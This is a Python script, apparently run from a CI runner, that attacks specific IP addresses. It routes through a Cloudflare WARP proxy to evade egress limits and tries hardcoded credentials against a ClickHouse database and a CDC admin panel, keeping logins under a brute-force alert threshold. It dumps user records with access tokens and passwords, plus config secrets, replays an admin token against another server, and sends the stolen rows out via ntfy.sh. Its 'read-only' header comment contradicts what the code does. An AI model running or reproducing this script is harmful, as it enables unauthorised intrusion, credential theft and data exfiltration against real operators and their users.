#!/usr/bin/env python3
# ci71114: probe 40.160.14.146 ClickHouse(:8123)/CDC-panel(:443) from
#   (A) GitHub-Azure runner egress (direct)  (B) Cloudflare WARP socks5 (127.0.0.1:40000)
# Strictly read-only. Low rate. No login to 147.135.76.13 (TCP-connect only).
import os, sys, json, socket, struct, time, ipaddress

try:
    import requests
except Exception:
    requests = None

TARGET   = "40.160.14.146"
MYSQL_A  = "147.135.76.13"        # TCP-connect only, NO credentials
PROXY    = ("127.0.0.1", 40000)
NTFY     = os.environ.get("NTFY_TOPIC", "")
UA       = "Mozilla/5.0 (ci71114)"
OUTDIR   = "results71114"

# controls prove the probe path works & whether 40.160 net is partly reachable from Azure egress
CONTROLS = [
    ("ctl-37-80",    "135.148.204.37", 80),
    ("ctl-37-3100",  "135.148.204.37", 3100),
    ("ctl-5080-3000","40.160.50.80",   3000),
    ("ctl-68229-3100","40.160.68.229", 3100),
]
TARGET_PORTS = [8123, 9000, 443, 3306, 3001, 80, 8080, 9004, 9440]
SOURCE_PORTS = [3306]  # 147.135.76.13, connectivity only

CK_CREDS = [("default", "12345678"), ("admin", "xinhuo.yibuapi!@#"), ("default", "")]
CK_WANT  = ["id","username","role","status","access_token","email","aff_code","password","display_name"]

OUT = {"runner": {}, "direct": {"controls": {}, "target": {}, "mysql_a": {}},
       "warp": {"controls": {}, "target": {}, "mysql_a": {}},
       "ck": {}, "panel": {}, "replay": {}, "summary": {}}

def log(*a):
    print(*a, flush=True)

def notify(msg):
    if not NTFY:
        return
    try:
        requests.post("https://ntfy.sh/" + NTFY, data=msg.encode("utf-8"),
                      headers={"Title": "ci71114"}, timeout=20)
    except Exception as e:
        log("[notify err]", e)

def notify_chunks(text, maxlen=3500):
    text = text.encode("utf-8", "replace").decode("utf-8")
    for i in range(0, len(text), maxlen):
        notify(text[i:i+maxlen])

# ---------- raw TCP (direct, no proxy = Azure runner egress) ----------
def direct_tcp(ip, port, timeout=8):
    st = time.time(); s = socket.socket(); s.settimeout(timeout)
    try:
        s.connect((ip, port)); return {"state": "open", "ms": int((time.time()-st)*1000)}
    except socket.timeout:
        return {"state": "timeout", "ms": int((time.time()-st)*1000)}
    except ConnectionRefusedError:
        return {"state": "refused", "ms": int((time.time()-st)*1000)}
    except Exception as e:
        return {"state": "exc", "exc": type(e).__name__, "str": str(e)[:120], "ms": int((time.time()-st)*1000)}
    finally:
        try: s.close()
        except Exception: pass

# ---------- raw SOCKS5 CONNECT through WARP local proxy (precise reply code) ----------
REP = {0:"open",1:"general_fail",2:"not_allowed",3:"net_unreach",4:"host_unreach",
       5:"refused",6:"ttl_expired",7:"cmd_unsupported",8:"atyp_unsupported"}
def socks5_tcp(ip, port, timeout=12):
    st = time.time(); s = socket.socket(); s.settimeout(timeout)
    try:
        s.connect(PROXY)
        s.sendall(b"\x05\x01\x00")
        g = s.recv(2)
        if len(g) < 2 or g[0] != 5:
            return {"state": "proxy_badgreet", "raw": g.hex(), "ms": int((time.time()-st)*1000)}
        s.sendall(b"\x05\x01\x00\x01" + ipaddress.ip_address(ip).packed + struct.pack("!H", port))
        r = s.recv(10)
        if len(r) >= 2:
            c = r[1]
            return {"state": REP.get(c, "rep_%d" % c), "rep": c, "ms": int((time.time()-st)*1000)}
        return {"state": "proxy_closed", "ms": int((time.time()-st)*1000)}
    except socket.timeout:
        return {"state": "proxy_timeout", "ms": int((time.time()-st)*1000)}
    except Exception as e:
        return {"state": "proxy_exc", "exc": type(e).__name__, "str": str(e)[:120], "ms": int((time.time()-st)*1000)}
    finally:
        try: s.close()
        except Exception: pass

def check(ip, port, via):
    return direct_tcp(ip, port) if via == "direct" else socks5_tcp(ip, port)

# ---------- HTTP ----------
def http(method, url, proxy=False, timeout=20, headers=None, data=None, session=None, verify=False):
    if requests is None:
        return {"err": "no_requests"}
    pr = {"http": "socks5h://127.0.0.1:40000", "https": "socks5h://127.0.0.1:40000"} if proxy else None
    fn = session.request if session else requests.request
    try:
        r = fn(method, url, proxies=pr, timeout=timeout, headers=headers or {}, data=data,
               verify=verify, allow_redirects=False)
        return {"code": r.status_code, "len": len(r.content),
                "ct": r.headers.get("Content-Type", ""),
                "loc": r.headers.get("Location", ""),
                "body": r.text[:2500]}
    except Exception as e:
        return {"err": type(e).__name__ + ": " + str(e)[:220]}

def ck_query(query, user, pw, proxy=False, timeout=25):
    url = "http://%s:8123/" % TARGET
    return http("GET", url, proxy=proxy, timeout=timeout,
                ) if False else _ck(query, user, pw, proxy, timeout)

def _ck(query, user, pw, proxy, timeout):
    if requests is None:
        return {"err": "no_requests"}
    pr = {"http": "socks5h://127.0.0.1:40000"} if proxy else None
    try:
        r = requests.get("http://%s:8123/" % TARGET,
                         params={"query": query, "user": user, "password": pw,
                                 "default_format": "TabSeparated"},
                         proxies=pr, timeout=timeout, verify=False)
        return {"code": r.status_code, "body": r.text[:6000]}
    except Exception as e:
        return {"err": type(e).__name__ + ": " + str(e)[:220]}

def desc_cols(desc_body):
    cols = []
    for line in desc_body.splitlines():
        p = line.split("\t")
        if p and p[0] and p[0] != "name":
            cols.append(p[0])
    return cols

def do_ck(proxy, label):
    seen = set()
    res = {"path": label, "ping": http("GET", "http://%s:8123/ping" % TARGET, proxy=proxy, timeout=15)}
    good = None
    for u, p in CK_CREDS:
        if (u, p) in seen: continue
        seen.add((u, p))
        r = _ck("SELECT 1", u, p, proxy, 20)
        res["auth__%s__%s" % (u, p)] = r
        b = (r.get("body") or "").strip()
        if r.get("code") == 200 and b.startswith("1"):
            good = (u, p); break
    if not good:
        res["_result"] = "no_cred_worked"
        return res
    u, p = good
    res["_good_cred"] = [u, p]
    res["version"] = _ck("SELECT version(), currentUser(), currentDatabase()", u, p, proxy, 20)
    res["databases"] = _ck("SHOW DATABASES", u, p, proxy, 20)
    res["tables"] = _ck("SHOW TABLES FROM yibuapi", u, p, proxy, 20)
    d = _ck("DESCRIBE TABLE yibuapi.users", u, p, proxy, 20)
    res["users_desc"] = d
    cols = desc_cols(d.get("body", ""))
    res["users_columns"] = cols
    proj = [c for c in CK_WANT if c in cols]
    if not proj:
        res["users_sample"] = _ck("SELECT * FROM yibuapi.users LIMIT 2", u, p, proxy, 25)
    else:
        order = "role" if "role" in cols else proj[0]
        res["users_count"] = _ck("SELECT count() FROM yibuapi.users", u, p, proxy, 20)
        res["users_admins"] = _ck("SELECT %s FROM yibuapi.users ORDER BY %s DESC LIMIT 30" % (",".join(proj), order), u, p, proxy, 30)
        if "role" in cols:
            res["users_role100"] = _ck("SELECT %s FROM yibuapi.users WHERE role>=100 ORDER BY role DESC LIMIT 30" % ",".join(proj), u, p, proxy, 30)
            res["users_active"] = _ck("SELECT %s FROM yibuapi.users WHERE role>=1 ORDER BY role DESC LIMIT 30" % ",".join(proj), u, p, proxy, 30)
    # options (may include turnstile secret etc.)
    od = _ck("DESCRIBE TABLE yibuapi.options", u, p, proxy, 20)
    res["options_desc"] = od
    ocols = desc_cols(od.get("body", ""))
    if "key" in ocols and "value" in ocols:
        res["options"] = _ck("SELECT key, value FROM yibuapi.options LIMIT 400", u, p, proxy, 30)
    else:
        res["options"] = _ck("SELECT * FROM yibuapi.options LIMIT 300", u, p, proxy, 30)
    res["_result"] = "ck_ok"
    return res

def do_panel(proxy, label):
    base = "https://%s" % TARGET
    res = {"path": label}
    s = requests.Session() if requests else None
    res["healthz"]   = http("GET", base + "/healthz", proxy, 15, session=s)
    res["root"]      = http("GET", base + "/", proxy, 15, session=s)
    res["api_health"]= http("GET", base + "/api/health", proxy, 15, session=s)
    res["api_me"]    = http("GET", base + "/api/me", proxy, 15, session=s)
    res["api_version"]=http("GET", base + "/api/version", proxy, 15, session=s)
    # <=2 login attempts (brute alert at 10/min)
    for u, p in [("root", "cdc@123"), ("root", "12345678")]:
        r = http("POST", base + "/api/login", proxy, 15,
                 headers={"Content-Type": "application/json"},
                 data=json.dumps({"username": u, "password": p}), session=s)
        res["login__%s__%s" % (u, p)] = r
        jb = (r.get("body") or "").replace(" ", "")
        if r.get("code") == 200 and '"ok":true' in jb:
            res["login_ok"] = [u, p]
            res["cfg_config"] = http("GET", base + "/api/config", proxy, 15, session=s)
            res["cfg_me"] = http("GET", base + "/api/me", proxy, 15, session=s)
            # common config/settings endpoints in cdc panel
            for ep in ["/api/settings", "/api/config/", "/api/status", "/api/connection", "/api/connections"]:
                res["cfg" + ep.replace("/", "_")] = http("GET", base + ep, proxy, 15, session=s)
            break
    return res

def do_replay(token, user_id=None, username=None):
    res = {}
    base = "http://135.148.204.37"
    h = {"Authorization": "Bearer %s" % token, "User-Agent": UA}
    if user_id is not None:
        h["New-Api-User"] = str(user_id)
    for via, px in [("azure_direct", False), ("warp", True)]:
        r = {}
        r["self"]   = http("GET", base + "/api/user/self", px, 20, headers=h)
        r["option"] = http("GET", base + "/api/option/", px, 20, headers=h)
        r["status"] = http("GET", base + "/api/status", px, 20)
        res[via] = r
        if r["self"].get("code") in (200,):
            break
    # without New-Api-User header
    res["self_noNAU"] = http("GET", base + "/api/user/self", False, 20,
                             headers={"Authorization": "Bearer %s" % token, "User-Agent": UA})
    return res

def find_admin_token(ck_res):
    """parse users_admins / users_role100 / users_active TabSeparated, return (token, id, username) for highest role w/ access_token"""
    cols = ck_res.get("users_columns") or []
    if "access_token" not in cols or "role" not in cols:
        return None
    idx = {c: cols.index(c) for c in cols}
    for key in ("users_role100", "users_admins", "users_active"):
        body = (ck_res.get(key) or {}).get("body") or ""
        best = None
        for line in body.splitlines():
            parts = line.split("\t")
            if len(parts) < len(cols):
                continue
            try:
                role = int(parts[idx["role"]])
            except Exception:
                continue
            tok = parts[idx["access_token"]]
            if not tok or tok in ("\\N", "NULL"):
                continue
            uid = parts[idx["id"]] if "id" in idx else None
            un  = parts[idx["username"]] if "username" in idx else None
            cand = (role, tok, uid, un)
            if best is None or cand[0] > best[0]:
                best = cand
        if best:
            return {"role": best[0], "access_token": best[1], "id": best[2], "username": best[3]}
    return None

def run_path(via):
    d = OUT[via]
    for name, ip, port in CONTROLS:
        d["controls"]["%s:%d" % (ip, port) if False else name] = check(ip, port, via)
    for port in TARGET_PORTS:
        d["target"][str(port)] = check(TARGET, port, via)
    for port in SOURCE_PORTS:
        d["mysql_a"][str(port)] = check(MYSQL_A, port, via)  # connectivity only

def main():
    os.makedirs(OUTDIR, exist_ok=True)
    if requests:
        try:
            k = requests.get("http://%s:8123/ping" % TARGET, timeout=1) and None
        except Exception:
            pass
    # egress
    try:
        OUT["runner"]["ipv4"] = requests.get("https://api.ipify.org", timeout=12).text.strip()
    except Exception as e:
        OUT["runner"]["ipv4_err"] = str(e)[:120]
    log("=== RUNNER EGRESS IPv4:", OUT["runner"].get("ipv4"))

    log("=== DIRECT (Azure) reachability ===")
    run_path("direct")
    log(json.dumps(OUT["direct"], ensure_ascii=False)[:2500])
    json.dump(OUT, open(OUTDIR + "/results.json", "w"), ensure_ascii=False, indent=1)

    log("=== WARP (socks5) reachability ===")
    run_path("warp")
    log(json.dumps(OUT["warp"], ensure_ascii=False)[:2500])
    json.dump(OUT, open(OUTDIR + "/results.json", "w"), ensure_ascii=False, indent=1)

    def open_direct(port): return OUT["direct"]["target"].get(str(port), {}).get("state") == "open"
    def open_warp(port):   return OUT["warp"]["target"].get(str(port), {}).get("state") == "open"

    # ---- ClickHouse: any path that reached 8123 ----
    ck_done = None
    if open_direct(8123) or open_warp(8123):
        log("=== 8123 reachable -> ClickHouse probes ===")
        OUT["ck"]["direct"] = do_ck(False, "direct")
        json.dump(OUT, open(OUTDIR + "/results.json", "w"), ensure_ascii=False, indent=1)
        if open_warp(8123):
            OUT["ck"]["warp"] = do_ck(True, "warp")
        ck_done = OUT["ck"].get("direct") or {}
        # prefer whichever worked
        for k in ("direct", "warp"):
            if OUT["ck"].get(k, {}).get("_result") == "ck_ok":
                ck_done = OUT["ck"][k]; break
    else:
        OUT["ck"]["_result"] = "8123 unreachable from both egress"
    json.dump(OUT, open(OUTDIR + "/results.json", "w"), ensure_ascii=False, indent=1)

    # ---- Panel: any path that reached 443 ----
    if open_direct(443) or open_warp(443):
        log("=== 443 reachable -> CDC panel probes ===")
        OUT["panel"]["direct"] = do_panel(False, "direct")
        json.dump(OUT, open(OUTDIR + "/results.json", "w"), ensure_ascii=False, indent=1)
        if open_warp(443):
            OUT["panel"]["warp"] = do_panel(True, "warp")
    else:
        OUT["panel"]["_result"] = "443 unreachable from both egress"
    json.dump(OUT, open(OUTDIR + "/results.json", "w"), ensure_ascii=False, indent=1)

    # ---- Replay to .37 if we got an admin access_token ----
    adm = None
    if isinstance(ck_done, dict) and ck_done.get("_result") == "ck_ok":
        adm = find_admin_token(ck_done)
    if adm and adm.get("access_token"):
        log("=== ADMIN access_token found -> replay to .37 ===")
        OUT["replay"]["admin"] = adm
        OUT["replay"]["res"] = do_replay(adm["access_token"], adm.get("id"), adm.get("username"))
        json.dump(OUT, open(OUTDIR + "/results.json", "w"), ensure_ascii=False, indent=1)
    else:
        OUT["replay"]["_result"] = "no admin access_token obtained"

    # ---- compact summary + ntfy ----
    def st(via):
        return {k: OUT[via]["target"][k]["state"] for k in OUT[via]["target"]}
    summ = {
        "egress": OUT["runner"].get("ipv4"),
        "direct_target": st("direct"),
        "warp_target": st("warp"),
        "direct_ctl": {k: v["state"] for k, v in OUT["direct"]["controls"].items()},
        "warp_ctl": {k: v["state"] for k, v in OUT["warp"]["controls"].items()},
        "mysql_a_tcp": {"direct": OUT["direct"]["mysql_a"], "warp": OUT["warp"]["mysql_a"]},
        "ck": ({"result": ck_done.get("_result"), "cred": ck_done.get("_good_cred"),
                "version": (ck_done.get("version") or {}).get("body","").strip(),
                "count": (ck_done.get("users_count") or {}).get("body","").strip(),
                "columns": ck_done.get("users_columns")}
               if isinstance(ck_done, dict) else str(ck_done)),
        "admin": adm,
        "replay_self_code": (OUT["replay"].get("res",{}).get("azure_direct",{}).get("self",{}).get("code")
                             if OUT["replay"].get("res") else None),
        "panel_login": {k:v.get("code") for k,v in (OUT["panel"].get("direct") or {}).items()
                        if k.startswith("login__")} if isinstance(OUT["panel"].get("direct"),dict) else None,
    }
    OUT["summary"] = summ
    json.dump(OUT, open(OUTDIR + "/results.json", "w"), ensure_ascii=False, indent=1)

    log("=====RESULT_JSON_BEGIN=====")
    log(json.dumps(summ, ensure_ascii=False, indent=1))
    log("=====RESULT_JSON_END=====")

    notify_chunks("ci71114 SUMMARY\n" + json.dumps(summ, ensure_ascii=False, indent=1))
    # if adm token + users rows, also ship raw users rows
    if isinstance(ck_done, dict) and ck_done.get("_result") == "ck_ok":
        for key in ("users_role100", "users_admins"):
            body = (ck_done.get(key) or {}).get("body") or ""
            if body:
                notify_chunks("ci71114 %s:\n%s" % (key, body[:6000]))
    if OUT["replay"].get("res"):
        for via, r in OUT["replay"]["res"].items():
            if via == "self_noNAU":
                notify_chunks("ci71114 replay %s code=%s\n%s" % (via, r.get("code"), (r.get("body") or "")[:1500]))
            else:
                notify_chunks("ci71114 replay %s self=%s option=%s\n%s\n%s" % (
                    via, r.get("self",{}).get("code"), r.get("option",{}).get("code"),
                    (r.get("self",{}).get("body") or "")[:1200], (r.get("option",{}).get("body") or "")[:1200]))
    log("=== DONE ===")

if __name__ == "__main__":
    try:
        main()
    except Exception:
        import traceback; traceback.print_exc()
        try:
            os.makedirs(OUTDIR, exist_ok=True)
            json.dump(OUT, open(OUTDIR + "/results.partial.json", "w"), ensure_ascii=False, indent=1)
        except Exception:
            pass
        notify_chunks("ci71114 ERROR: " + traceback.format_exc()[-1500:])
        sys.exit(3)
